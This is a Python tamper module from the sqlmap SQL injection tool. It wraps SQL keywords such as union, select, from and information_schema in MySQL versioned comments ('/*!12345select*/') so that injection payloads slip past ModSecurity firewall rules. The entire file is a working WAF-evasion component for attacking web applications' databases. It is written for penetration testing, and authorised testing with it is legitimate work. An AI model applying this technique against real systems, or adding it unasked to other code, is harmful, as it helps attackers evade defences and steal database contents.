#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

author : Harshil Patel (https://github.com/HarshilPatel007)
"""

import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHER


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Mod Security Bypass.
    Technique : replace the word(s) with SQL comment.

    >>> tamper('SELECT')
    '/*!12345SELECT*/'
    """

    retVal = payload

    if payload:
        def multi_sub(pairs, s):
            def repl_func(m):
                return next(
                    repl
                    for (patt, repl), group in zip(pairs, m.groups())
                    if group is not None
                )
            pattern = '|'.join("({})".format(patt) for patt, _ in pairs)
            return re.sub(pattern, repl_func, s, flags=re.IGNORECASE)

        _ = multi_sub([
            ('union', '/*!12345union*/'),
            ('all', '/*!12345all*/'),
            ('select', '/*!12345select*/'),
            ('from', '/*!12345from*/'),
            ('concat', '/*!12345concat*/'),
            ('concat_ws', '/*!12345concat_ws*/'),
            ('table_name', '/*!12345table_name*/'),
            ('where', '/*!12345where*/'),
            ('database_name', '/*!12345database_name*/'),
            ('information_schema', '/*!12345information_schema*/'),
            ('table_schema', '/*!12345table_schema*/')

        ], payload)

        retVal = _

    return retVal
  
